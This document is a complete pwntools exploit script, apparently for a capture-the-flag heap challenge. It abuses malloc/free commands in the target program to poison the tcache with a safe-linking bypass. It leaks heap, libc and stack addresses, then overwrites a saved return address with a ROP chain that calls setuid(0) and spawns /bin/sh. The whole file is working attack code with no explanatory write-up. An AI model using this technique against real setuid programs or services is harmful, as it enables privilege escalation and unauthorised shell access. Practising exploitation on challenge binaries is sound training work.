#!/bin/python 

from pwn import *
import sys

context.arch = 'amd64'

BUFFER_OFF = 0x118
GOAL = "win"

def get_leak():
    proc.recvuntil(b"[LEAK]")
    proc.recvuntil(b": ")
    return int(proc.recvline(drop=True)[:-1], 16)


def malloc(idx, size):
    proc.sendline(b"malloc")
    proc.sendline(str(idx))
    proc.sendline(str(size))


def free(idx):
    proc.sendline(b"free")
    proc.sendline(str(idx))


def scanf(idx, contents: bytes):
    proc.sendline(b"safe_read")
    proc.sendline(str(idx))
    proc.sendline(contents)


def puts(idx):
    proc.sendline(b"safe_write")
    proc.clean()
    proc.sendline(str(idx))

    proc.recvline()
    return proc.recvline(drop=True)


def overwrite_next(size, contents: bytes):
    malloc(0, size)
    malloc(1, size)
    malloc(2, size)
    free(2)
    free(1)

    scanf(0, b'X' * (size+8) + contents)


def tcache_get_two_entries(bin):
    malloc(14, bin)
    malloc(15, bin)
    free(15)
    free(14)


def get_addr_num(addr: bytes):
    return u64(addr.ljust(8, b'\x00'))


proc = process(sys.argv[1], setuid=False, aslr=False)
libc = proc.elf.libc
if not libc:
    print("Libc is none...")
    libc = ELF('/challenge/libc/libc.so.6')


WILDERNESS_SIZE = 0x21000 - 0x290 - 0x20
# First malloc's size from fdopen => 0x1d8 (59 qwords)  *
FDOPEN_ALLOC = 0x1d8
# Second from _IO_file_doallocate => 0x400 (128 qwords)
IOFILE_ALLOC = 0x400

FIRST_ALLOC_OFF = 0x2a0


# Leaking libc
size = FDOPEN_ALLOC
malloc(0, size)
malloc(1, size)
malloc(2, size)
free(1)
free(2)

heap_leak = get_addr_num(puts(0)[-8:])
goal_addr = heap_leak * (16 ** 3) + (FIRST_ALLOC_OFF + (size + 8) * 2)
print("[$] heap leak: " + hex(heap_leak))
print("[$] goal addr: " + hex(goal_addr))

malloc(1, size)
malloc(2, size)
free(2)
free(1)
scanf(0, b'X' * (size+8) + p64( heap_leak ^ goal_addr ))
malloc(15, size)

malloc(0, size)
libc.address = get_addr_num(puts(0)[-24:-16]) - libc.symbols['_IO_wfile_jumps']
print("[$] libc address: " + hex(libc.address))


# Leaking stack
size = 24
LIBC_SYM = 'environ'

overwrite_next(size, p64(heap_leak ^ (libc.symbols[LIBC_SYM])))
malloc(1, size)
malloc(0, size)
stack_leak = get_addr_num(puts(0)[:8]) 
print("[$] stack leak: " + hex(stack_leak))


# ROP chain creation
rop = ROP(libc)
rop.setuid(0)
rop.system(next(libc.search(b'/bin/sh')))
chain_len = len(rop.chain())
print('\n' + rop.dump() + f'\nSize of chain: {hex(chain_len)}')


# Overwrite the ret rip
size = ((chain_len + 16 * 2) & 0xFFF0 )- 8
overwrite_next(size, p64(heap_leak ^ (stack_leak - 0x128)))
malloc(1, size)
malloc(0, size)
scanf(0, b'X' * 8 + (rop.chain()))

if len(sys.argv) > 2:
    gdb.attach(proc, gdbscript='''
               pwndbg-init
               b *main+386
               c
               ''')


proc.sendline(b'quit')
proc.interactive()
